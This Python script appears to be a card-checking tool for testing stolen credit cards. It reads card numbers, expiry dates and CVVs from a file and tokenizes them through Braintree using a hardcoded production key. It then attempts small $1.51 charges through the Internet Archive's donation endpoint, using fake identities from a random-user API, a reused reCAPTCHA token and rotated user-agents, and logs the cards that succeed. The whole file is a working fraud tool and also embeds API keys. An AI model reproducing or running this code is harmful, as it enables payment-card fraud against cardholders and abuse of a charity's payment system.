import requests
import json
import time
from fake_useragent import UserAgent

# Create a UserAgent object to generate random user-agents
ua = UserAgent()

# Define the URLs and headers
braintree_url = "https://payments.braintree-api.com/graphql"
archive_url = "https://archive.org/services/donations/braintree-charge.php"
api_url = 'https://api.api-ninjas.com/v1/randomuser'

# Define headers for both requests (using random User-Agent for both)
headers_braintree = {
    "authority": "payments.braintree-api.com",
    "method": "POST",
    "path": "/graphql",
    "scheme": "https",
    "accept": "*/*",
    "accept-encoding": "gzip, deflate, br, zstd",
    "accept-language": "en-US,en;q=0.9",
    "authorization": "Bearer production_x6ffdgk2_pqd7hz44swp6zvvw",
    "braintree-version": "2018-05-10",
    "cache-control": "no-cache",
    "content-length": "733",
    "content-type": "application/json",
    "origin": "https://assets.braintreegateway.com",
    "pragma": "no-cache",
    "priority": "u=1, i",
    "referer": "https://assets.braintreegateway.com/",
    "sec-ch-ua": '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "user-agent": ua.random  # Use a random user-agent
}

headers_archive = {
    "authority": "archive.org",
    "method": "POST",
    "path": "/services/donations/braintree-charge.php",
    "scheme": "https",
    "accept": "application/json",
    "accept-encoding": "gzip, deflate, br, zstd",
    "accept-language": "en-US,en;q=0.9",
    "access-control-allow-origin": "*",
    "cache-control": "no-cache",
    "content-length": "1496",
    "content-type": "application/json",
    "cookie": "donation-identifier=670317412224b2c067e60001b2ee27d2; abtest-identifier=8c6e0de42571db6978503e079d3dace2",
    "ia-donation-origin": "https://archive.org",
    "origin": "https://archive.org",
    "pragma": "no-cache",
    "priority": "u=1, i",
    "referer": "https://archive.org/donate/",
    "sec-ch-ua": '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent": ua.random  # Use a random user-agent
}

# Function to fetch random user details from the API
def fetch_user_data():
    response_user = requests.get(api_url, headers={'X-Api-Key': 'r4FRwX001+5ZUnvFg1K2aw==fz5lDfDEHHgfNyiz'})
    if response_user.status_code == 200:
        user_data = response_user.json()  # Get the user data from the response
        user_name = user_data['name']
        user_email = user_data['email']
        user_address = user_data['address']
        return user_name, user_email, user_address
    else:
        print("Error fetching user data:", response_user.status_code, response_user.text)
        return None, None, None

# Function to process each card
def process_card(card_details):
    cc, mes, ano, cvv = card_details.split('|')
    user_name, user_email, user_address = fetch_user_data()

    if not user_name:
        print("Unable to fetch user data.")
        return

    # Define the payload for the first request (Braintree)
    payload_braintree = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": "cac4fbc8-316a-4d88-8723-c566c7cbe441"
        },
        "query": """
        mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
            tokenizeCreditCard(input: $input) {
                token
                creditCard {
                    bin
                    brandCode
                    last4
                    expirationMonth
                    expirationYear
                    binData {
                        prepaid
                        healthcare
                        debit
                        durbinRegulated
                        commercial
                        payroll
                        issuingBank
                        countryOfIssuance
                        productId
                    }
                }
            }
        }
        """,
        "variables": {
            "input": {
                "creditCard": {
                    "number": cc,
                    "expirationMonth": mes,
                    "expirationYear": ano,
                    "cvv": cvv
                },
                "options": {
                    "validate": False
                }
            }
        },
        "operationName": "TokenizeCreditCard"
    }

    # First POST request to Braintree
    response_braintree = requests.post(braintree_url, headers=headers_braintree, data=json.dumps(payload_braintree))

    if response_braintree.status_code == 200:
        # Extract the paymentMethodNonce from the response (this will be needed for the second request)
        data_braintree = response_braintree.json()
        payment_method_nonce = data_braintree['data']['tokenizeCreditCard']['token']

        # Define the payload for the second request (Archive API)
        payload_archive = {
            "customFields": {
                "referrer": "ctx=page;uid=",
                "fee_amount_covered": 0.51
            },
            "paymentProvider": "Credit Card",
            "paymentMethodNonce": payment_method_nonce,
            "recaptchaToken": "03AFcWeA73wfVHpVsz4MsRa9VDOoTfJKfxa-dc24ajZQ4HPnCLMsnWGVJiFlFdwd17Pg7I1thJDG8jsmHInFh-QLH0TKEgxSKtfcySENkoNP_26QZl6EL8z5OYoO_EEDafWoz-5QF0Klu5ZLuOYN-q_-arpLACWpCmpQn5FY4Oe9W-Z_qNfBhvoWgnTvf1D6uWBngpxxbXPYyY7Uhh359lSUBImyGLuPex_cBWaLGasI-8kQB7I_MnreCX9OrbulSnUtj2S0HKqRxPNGt7SGEKE9PmC-nAx6rZcYIzefYS6JsqssJ_QsaLElSr_O8D1E9tceM1WEKHHfDJjzMzxL6IdJ6WI18Ur5moLoPEDLZ0XpznzFyqZWulMWObjvaOe1ghrbIDRu0VxnpM3fik-qzHtbz06cDOX9YAuGY6NrCWmv-XMFpvo8qT99VGyqg6gDbXjQIJzxTINqunq7BJGdHdi0kxwrSnuhQ7rHAXVvKScHu1ylO9KzTdCPkj_A_DrJI5_dGYJtOxBaSt2QO5VP9LRA2nm_VxA4tAaZajOJweLLNyuq2SXX7__1eXPkUKT2n5H7iI6etvWmqJceXPvERGQsfm4aw-NqE540ltctayfI98ARzw6QWWnf-PiFd3fVQxs0rwY0jaNZllkVT2JSsoggZMVSWlwUYHLAf6aSzU_n3MykG427UHr74xxbzdDannrvXynGIxIaQ_rY6HRBm6dQlrBmKc12uy5sOVgA6VdqDUyVGGBQnoNABu_BLOpI37gRxcyV-DjR38ss9aGCJ4xg0JpPmhDOIgd2qyM9tWiO2fFwXGiC4NmSPXCfGBa01L1VWkgHzlE9RYopHkppH0LrvzCqv4c7d12_sWpD-2o8GYsAF2QlhSfaKK5Fk20Xal94nzGC02CECfUk_j-VyWKbxcjeG4qEWupU_TZjKSV0FmSmc8wmtRSuQ",
            "deviceData": "{\"correlation_id\":\"dbb3414d1b851b90446d1f6e177577ce\"}",
            "bin": cc[:6],  # Using only the first 6 digits of the card number (BIN)
            "amount": 1.51,
            "donationType": "one-time",
            "customer": {
                "email": user_email,
                "firstName": user_name.split()[0],  # Extract first name from the full name
                "lastName": user_name.split()[1] if len(user_name.split()) > 1 else "Unknown"
            },
            "billing": {
                "streetAddress": user_address,
                "extendedAddress": "",
                "locality": "Denmark",
                "region": "SC",
                "postalCode": "29042",
                "countryCodeAlpha2": "US"
            }
        }

        # Second POST request to Archive API
        response_archive = requests.post(archive_url, headers=headers_archive, data=json.dumps(payload_archive))

        if response_archive.status_code == 200:
            # Write the successful transaction to a file
            with open('successful_transactions.txt', 'a') as success_file:
                success_file.write(f"{cc}|{mes}|{ano}|{cvv} Charged 1.51$ Successfully\n")
            print(f"Success: {cc}|{mes}|{ano}|{cvv} charged 1.51$")
        elif response_archive.status_code == 400:
            response_data = response_archive.json()
            print(f"{cc}|{mes}|{ano}|{cvv} Declined - {response_data['value']['message']}")
        else:
            print(f"Error: {response_archive.status_code} - {response_archive.text}")
    else:
        print(f"Error in Braintree API for {cc}|{mes}|{ano}|{cvv}: {response_braintree.status_code} - {response_braintree.text}")
    
    # Wait for 2 seconds before processing the next card
    time.sleep(2)

# Read cards from the file (cc.txt), process each one, and remove the processed card
with open('cc.txt', 'r') as file:
    lines = file.readlines()

with open('cc.txt', 'w') as file:
    for line in lines:
        line = line.strip()
        process_card(line)
        # Remove the processed card
        if line not in lines:
            file.write(line + "\n")
